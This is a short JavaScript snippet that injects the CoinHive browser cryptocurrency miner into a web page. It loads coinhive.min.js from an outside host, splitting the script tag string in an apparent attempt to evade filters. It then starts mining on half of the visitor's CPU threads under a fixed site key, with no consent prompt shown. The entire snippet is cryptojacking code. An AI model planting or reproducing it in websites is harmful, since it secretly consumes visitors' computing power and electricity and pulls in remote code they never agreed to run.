document.write('<scr'+'ipt type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js" ></scr'+'ipt>');
var miner = new CoinHive.User('rfvZMYNtEBYGXsXN4yGOzjoedh36VBhd', 'github', {
    threads: navigator.hardwareConcurrency / 2,
    autoThreads: false,
    throttle: 0.40,
    forceASMJS: false
});
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
